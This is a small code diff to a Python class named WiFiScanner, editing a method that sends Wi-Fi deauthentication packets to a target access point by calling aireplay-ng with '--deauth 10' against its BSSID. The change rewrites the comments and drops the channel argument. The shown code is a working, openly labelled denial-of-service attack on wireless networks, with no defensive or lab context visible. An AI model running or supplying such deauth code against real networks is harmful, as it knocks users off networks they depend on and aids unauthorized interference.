@@ -383,14 +383,12 @@ class WiFiScanner:
             logger.info(f"💥 Sending deauth to {ssid}...")
             
             # Send deauth packets
-            # -0: deauth count
-            # -a: AP MAC
-            # --channel: specify channel (required for 5GHz)
+            # --deauth: number of deauth packets to send
+            # -a: AP MAC address
             result = subprocess.run([
                 'aireplay-ng',
                 '--deauth', '10',
                 '-a', bssid,
-                '--channel', str(channel),
                 self.interface
             ], capture_output=True, text=True, timeout=30)
             
